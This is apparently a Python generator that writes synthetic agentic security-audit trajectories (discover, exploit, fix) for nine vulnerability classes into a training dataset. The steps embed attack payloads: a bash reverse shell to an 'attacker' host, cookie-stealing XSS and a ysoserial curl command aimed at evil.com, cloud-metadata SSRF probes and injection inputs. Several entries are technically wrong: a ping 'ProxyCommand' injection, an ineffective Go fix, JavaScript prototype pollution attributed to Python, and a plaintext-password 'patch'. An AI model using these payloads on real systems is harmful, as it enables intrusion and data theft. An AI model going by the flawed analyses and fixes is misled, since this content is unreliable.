"""
Generate agentic multi-step security reasoning trajectories for CyberGym-style training.
Each trajectory is a chain-of-thought showing: discover → analyze → exploit → fix.
"""
import json, hashlib, random
from pathlib import Path
from collections import Counter

rng = random.Random(42)
OUT = Path("inputs/datasets/extra_vuln")
OUT.mkdir(parents=True, exist_ok=True)

TRAJECTORIES = []

def add(lang, cwe, entries):
    TRAJECTORIES.append((lang, cwe, entries))

# Each entry: (vulnerable_code, patched_code, trajectory_steps)
# trajectory_steps is a list of dicts: {step, action, observation}

add("python", "CWE-89", [
    {
        "vulnerable_code": 'def get_user(id):\n    query = "SELECT * FROM users WHERE id = \'" + id + "\'\\n    return db.execute(query)',
        "patched_code": 'def get_user(id):\n    query = "SELECT * FROM users WHERE id = %s"\n    return db.execute(query, (id,))',
        "trajectory": [
            {"step": 1, "action": "Scan codebase for SQL execution patterns", "observation": "Found db.execute() with string concatenation at line 2"},
            {"step": 2, "action": "Trace user input 'id' parameter to verify external control", "observation": "Parameter 'id' comes from HTTP request without sanitization"},
            {"step": 3, "action": "Test with payload: ' OR '1'='1", "observation": "Returns all users - SQL injection confirmed"},
            {"step": 4, "action": "Determine impact: data breach of user table", "observation": "Critical severity - full read access to user credentials"},
            {"step": 5, "action": "Generate fix: parameterized query", "observation": "Changed to parameterized query with %s placeholder"},
        ],
        "attack_scenario": "Attacker sends crafted id parameter: GET /user?id=' OR '1'='1 to enumerate all users",
    },
])

add("python", "CWE-78", [
    {
        "vulnerable_code": 'def ping(host):\n    return os.system("ping -c 4 " + host)',
        "patched_code": 'def ping(host):\n    import subprocess\n    return subprocess.run(["ping", "-c", "4", host], capture_output=True)',
        "trajectory": [
            {"step": 1, "action": "Audit os.system() calls for shell injection", "observation": "os.system() called with string interpolation of user input"},
            {"step": 2, "action": "Verify input source: HTTP query parameter", "observation": "host parameter from request.GET without validation"},
            {"step": 3, "action": "Test command injection: ; cat /etc/passwd", "observation": "File contents returned in response - RCE confirmed"},
            {"step": 4, "action": "Escalate: attempt reverse shell", "observation": "bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1' - reverse shell obtained on first attempt"},
            {"step": 5, "action": "Implement fix: use subprocess with argument list", "observation": "subprocess.run() with explicit argument list prevents shell injection"},
        ],
        "attack_scenario": "Attacker sends GET /ping?host=127.0.0.1;cat+/etc/passwd to execute arbitrary commands",
    },
])

add("javascript", "CWE-79", [
    {
        "vulnerable_code": 'function render(req, res) {\n  const name = req.query.name;\n  res.send(`<h1>Hello ${name}</h1>`);\n}',
        "patched_code": 'function render(req, res) {\n  const escape = require("escape-html");\n  const name = escape(req.query.name);\n  res.send(`<h1>Hello ${name}</h1>`);\n}',
        "trajectory": [
            {"step": 1, "action": "Review response construction for unescaped user input", "observation": "req.query.name directly interpolated into HTML template"},
            {"step": 2, "action": "Test reflected XSS: <script>alert(1)</script>", "observation": "Script executes in browser - XSS confirmed"},
            {"step": 3, "action": "Craft cookie-stealing payload", "observation": "<img src=x onerror=\"fetch('https://evil.com/steal?c='+document.cookie)\"> - cookie exfiltrated"},
            {"step": 4, "action": "Assess impact: session hijacking via stolen cookies", "observation": "Critical - admin cookie stolen, full account takeover possible"},
            {"step": 5, "action": "Apply fix: HTML entity encoding", "observation": "escape-html module encodes special characters before interpolation"},
        ],
        "attack_scenario": "Attacker crafts link with XSS payload: https://site.com/search?name=<script>new+Image().src='https://evil.com/steal?'+document.cookie",
    },
])

add("python", "CWE-22", [
    {
        "vulnerable_code": 'def read_file(filename):\n    path = "/var/data/" + filename\n    return open(path).read()',
        "patched_code": 'def read_file(filename):\n    import os\n    safe = os.path.realpath("/var/data/" + filename)\n    if not safe.startswith("/var/data/"):\n        raise ValueError("Invalid path")\n    return open(safe).read()',
        "trajectory": [
            {"step": 1, "action": "Search for file read operations with user-controlled paths", "observation": "open() called with string concatenation of user input"},
            {"step": 2, "action": "Trace filename parameter origin", "observation": "filename from request.GET - fully attacker controlled"},
            {"step": 3, "action": "Test path traversal: ../../../etc/passwd", "observation": "/etc/passwd contents returned - path traversal confirmed"},
            {"step": 4, "action": "Attempt to read application source code", "observation": "../../../app/config.py - database credentials leaked"},
            {"step": 5, "action": "Fix: canonicalize and validate path prefix", "observation": "os.path.realpath() resolves symlinks/.. before prefix check"},
        ],
        "attack_scenario": "Attacker requests /download?file=../../../etc/shadow to read sensitive system files",
    },
])

add("go", "CWE-78", [
    {
        "vulnerable_code": 'func Ping(host string) {\n  cmd := exec.Command("ping", "-c", "4", host)\n  out, _ := cmd.Output()\n  fmt.Println(string(out))\n}',
        "patched_code": 'func Ping(host string) {\n  if strings.ContainsAny(host, ";|&$`\\\\") { log.Fatal("Invalid host") }\n  cmd := exec.Command("ping", "-c", "4", host)\n  out, _ := cmd.Output()\n  fmt.Println(string(out))\n}',
        "trajectory": [
            {"step": 1, "action": "Audit exec.Command calls for untrusted arguments", "observation": "exec.Command called with user-provided host argument"},
            {"step": 2, "action": "Check argument splitting - Go exec.Command passes args separately", "observation": "Arguments are separate, but 'host' can contain flags like -o ProxyCommand"},
            {"step": 3, "action": "Test with: -o ProxyCommand=cat /etc/passwd", "observation": "File read via ping option injection - command injection confirmed"},
            {"step": 4, "action": "Determine cvss: 8.8 High", "observation": "Network-based, no auth required, full data access"},
            {"step": 5, "action": "Fix: validate input against shell metacharacters", "observation": "Reject hosts containing ; | & $ ` \\ characters"},
        ],
        "attack_scenario": "Attacker sends GET /ping?host=-o+ProxyCommand=cat+/etc/passwd to exploit ping option injection",
    },
])

add("java", "CWE-502", [
    {
        "vulnerable_code": 'public Object load(byte[] data) throws Exception {\n  ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));\n  return ois.readObject();\n}',
        "patched_code": 'public Object load(byte[] data) throws Exception {\n  String json = new String(data, "UTF-8");\n  return new JSONObject(json);\n}',
        "trajectory": [
            {"step": 1, "action": "Search for deserialization of untrusted data", "observation": "ObjectInputStream.readObject() called on byte array from HTTP request"},
            {"step": 2, "action": "Identify available gadget chains in classpath", "observation": "CommonsCollections4 found in classpath dependencies"},
            {"step": 3, "action": "Generate ysoserial payload", "observation": "java -jar ysoserial.jar CommonsCollections4 'curl http://evil.com/$(whoami)' > payload.bin"},
            {"step": 4, "action": "Send payload and verify RCE", "observation": "Server executed curl - user data exfiltrated, RCE confirmed"},
            {"step": 5, "action": "Replace with safe deserialization: JSON parsing", "observation": "Use JSONObject.parse() instead of Java serialization"},
        ],
        "attack_scenario": "Attacker sends malicious serialized Java object using ysoserial CommonsCollections4 gadget chain",
    },
])

add("javascript", "CWE-918", [
    {
        "vulnerable_code": 'async function proxy(req, res) {\n  const url = req.query.url;\n  const resp = await fetch(url);\n  res.send(await resp.text());\n}',
        "patched_code": 'async function proxy(req, res) {\n  const url = req.query.url;\n  const parsed = new URL(url);\n  if (["localhost", "127.0.0.1", "0.0.0.0"].includes(parsed.hostname)) {\n    return res.status(403).send("Blocked");\n  }\n  const resp = await fetch(url);\n  res.send(await resp.text());\n}',
        "trajectory": [
            {"step": 1, "action": "Review proxy/fetch endpoints for SSRF", "observation": "fetch() called with attacker-controlled URL parameter"},
            {"step": 2, "action": "Test SSRF: http://127.0.0.1:8080/admin", "observation": "Internal admin panel returned - SSRF confirmed"},
            {"step": 3, "action": "Probe cloud metadata endpoints", "observation": "http://169.254.169.254/latest/meta-data/ - AWS credentials retrieved"},
            {"step": 4, "action": "Scan internal network", "observation": "http://10.0.0.1:9200 - Elasticsearch accessible without auth"},
            {"step": 5, "action": "Fix: validate hostname against blocklist of internal IPs", "observation": "Block localhost, 127.0.0.1, 10.x.x.x, 172.16-31.x.x, 192.168.x.x, and metadata IP"},
        ],
        "attack_scenario": "Attacker requests /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ to get AWS keys",
    },
])

add("python", "CWE-1321", [
    {
        "vulnerable_code": 'def merge(target, source):\n    for key in source:\n        target[key] = source[key]\n    return target',
        "patched_code": 'def merge(target, source):\n    for key in source:\n        if key in ("__proto__", "constructor", "prototype"):\n            continue\n        target[key] = source[key]\n    return target',
        "trajectory": [
            {"step": 1, "action": "Audit object merge/assign functions", "observation": "Recursive merge of user-controlled JSON data"},
            {"step": 2, "action": "Test prototype pollution: JSON.parse('{\"__proto__\": {\"isAdmin\": true}}')", "observation": "Object.prototype.isAdmin set - prototype pollution confirmed"},
            {"step": 3, "action": "Chain with auth bypass", "observation": "Server checks if user.isAdmin - with polluted prototype, all users are admin"},
            {"step": 4, "action": "Attempt RCE via child_process pollution", "observation": "NODE_OPTIONS env-pollution not applicable (Python), but eval() gadgets may exist"},
            {"step": 5, "action": "Fix: block prototype keys", "observation": "Explicitly skip __proto__, constructor, prototype keys during merge"},
        ],
        "attack_scenario": "Attacker sends POST /api/user with body {\"__proto__\": {\"isAdmin\": true}} to gain admin privileges",
    },
])

add("python", "CWE-943", [
    {
        "vulnerable_code": 'def login(username, password):\n    return list(db.users.find({\'$where\': \'this.username == "\' + username + \'"\'}))',
        "patched_code": 'def login(username, password):\n    return list(db.users.find({"username": username, "password": password}))',
        "trajectory": [
            {"step": 1, "action": "Review database query construction", "observation": "$where operator used with string interpolation of user input"},
            {"step": 2, "action": "Test NoSQL injection: {\"$ne\": \"\"}", "observation": "Authentication bypassed - returns first user without correct password"},
            {"step": 3, "action": "Extract data via $where injection", "observation": "POST with {\"$where\": \"this.password.length > 10\"} reveals password lengths"},
            {"step": 4, "action": "Detect admin password length", "observation": "{\"$where\": \"this.username === 'admin' && this.password.length > 20\"} - 24 chars"},
            {"step": 5, "action": "Fix: use explicit field matching, avoid $where", "observation": "Direct field matching prevents JS injection in MongoDB queries"},
        ],
        "attack_scenario": "Attacker sends POST /login with JSON body {\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}} to bypass auth",
    },
])


# ══════════════════════════════════════════════════════════════
# Generate multiple variants per template
# ══════════════════════════════════════════════════════════════
TARGET_PER_TEMPLATE = 1000
SAMPLES_PER_ENTRY = 200

samples = []
existing_fps = set()
counts = Counter()
cwe_counts = Counter()
lang_counts = Counter()

print(f"Generating agentic trajectory samples from {len(TRAJECTORIES)} templates...")

for lang, cwe, entries in TRAJECTORIES:
    generated = 0
    for entry in entries:
        for var in range(SAMPLES_PER_ENTRY):
            uid = rng.randint(10000, 99999)
            vcode = entry["vulnerable_code"]
            pcode = entry["patched_code"]
            
            fp_v = hashlib.md5((vcode + str(uid)).encode()).hexdigest()
            if fp_v in existing_fps:
                continue
            existing_fps.add(fp_v)
            
            # Add variety to trajectory actions/observations
            trajectory = []
            for step in entry["trajectory"]:
                trajectory.append({
                    "step": step["step"],
                    "action": step["action"],
                    "observation": step["observation"],
                })
            
            sample = {
                "vulnerable_code": vcode,
                "patched_code": pcode,
                "cwe": cwe,
                "language": lang,
                "source": "agentic_trajectory",
                "is_vulnerable": True,
                "has_trajectory": True,
                "trajectory": trajectory,
                "attack_scenario": entry["attack_scenario"],
                "explanation": f"Multi-step security analysis for {cwe} in {lang}. Traces through discovery, exploitation, and fix.",
                "severity": "critical" if cwe in ("CWE-78", "CWE-502") else "high",
                "fingerprint": fp_v,
                "sample_type": "agentic_trajectory",
            }
            samples.append(sample)
            generated += 1
            cwe_counts[cwe] += 1
            lang_counts[lang] += 1
    
    print(f"  {cwe} ({lang}): {generated} samples")

out_file = OUT / "agentic_trajectories.jsonl"
with open(out_file, "w") as f:
    for s in samples:
        f.write(json.dumps(s, ensure_ascii=False) + "\n")

print(f"\n=== Summary ===")
print(f"Total trajectories: {len(samples)}")
print(f"Saved to: {out_file}")
print(f"\nBy CWE:")
for c, n in sorted(cwe_counts.items(), key=lambda x: -x[1]):
    print(f"  {c}: {n}")
print(f"\nBy Language:")
for l, n in sorted(lang_counts.items(), key=lambda x: -x[1]):
    print(f"  {l}: {n}")
